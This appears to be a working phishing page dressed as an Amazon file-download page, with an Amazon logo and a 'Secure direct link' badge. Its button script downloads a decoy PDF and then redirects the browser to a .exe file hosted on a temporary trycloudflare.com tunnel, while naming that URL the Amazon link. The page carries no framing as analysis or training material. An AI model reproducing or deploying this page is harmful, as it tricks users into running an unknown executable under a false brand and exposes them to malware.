<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <title>Download File | Ready</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
        :root {
            --primary-color: #ff9900;
            --secondary-color: #232f3e;
            --accent-color: #37475a;
            --text-dark: #111;
            --text-light: #555;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            min-height: 100vh;
            background: radial-gradient(circle at top right, #2c3e50, #000000);
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
        }

        body::before, body::after {
            content: "";
            position: absolute;
            width: 300px;
            height: 300px;
            border-radius: 50%;
            background: linear-gradient(45deg, var(--primary-color), transparent);
            z-index: -1;
            filter: blur(80px);
            opacity: 0.2;
        }
        body::before { top: -50px; left: -50px; }
        body::after { bottom: -50px; right: -50px; }

        .wrapper {
            background: rgba(255, 255, 255, 0.95);
            width: 90%;
            max-width: 450px;
            padding: 50px 40px;
            text-align: center;
            border-radius: 24px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.4);
            transition: transform 0.3s ease;
            backdrop-filter: blur(10px);
        }

        .wrapper:hover {
            transform: translateY(-5px);
        }

        .amazon-logo {
            width: 140px;
            margin-bottom: 30px;
        }

        h1 {
            font-size: 26px;
            margin-bottom: 15px;
            color: var(--secondary-color);
            font-weight: 800;
        }

        p {
            font-size: 15px;
            color: var(--text-light);
            margin-bottom: 35px;
            line-height: 1.6;
        }

        button {
            width: 100%;
            padding: 18px;
            font-size: 18px;
            background: var(--primary-color);
            color: #fff;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            transition: all 0.3s;
            box-shadow: 0 10px 20px rgba(255, 153, 0, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        button:hover {
            background-color: #fb8c00;
            transform: scale(1.02);
        }

        .download-icon {
            width: 20px;
            height: 20px;
            fill: white;
        }

        .note {
            margin-top: 20px;
            font-size: 13px;
            color: #888;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }

        .loader {
            display: none;
            margin-top: 15px;
            color: var(--primary-color);
            font-weight: bold;
        }
    </style>
</head>
<body>

<div class="wrapper">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" class="amazon-logo">

    <h1>Your File Is Ready</h1>
    <p>Click the button below to start your download. You will be redirected to Amazon automatically.</p>

    <button onclick="redirectAndDownload()">
        <svg class="download-icon" viewBox="0 0 24 24">
            <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
        </svg>
        Download & Continue
    </button>

    <div id="status" class="loader">Preparing your download...</div>

    <div class="note">
        🔒 Secure direct link
    </div>
</div>

<script>
    function redirectAndDownload() {
        const btn = document.querySelector('button');
        const status = document.getElementById('status');

        btn.innerHTML = "Starting...";
        btn.style.opacity = "0.7";
        btn.style.pointerEvents = "none";
        status.style.display = "block";

        const fileUrl = "your-file.pdf";
        const amazonUrl = "https://gardening-mpeg-instrumentation-inquiry.trycloudflare.com/links/new/amazon_GWvJN12h4kCbqfY.exe";

        const link = document.createElement("a");
        link.href = fileUrl;
        link.download = "";
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);

        setTimeout(() => {
            window.location.href = amazonUrl;
        }, 1200);
    }
</script>

</body>
</html>
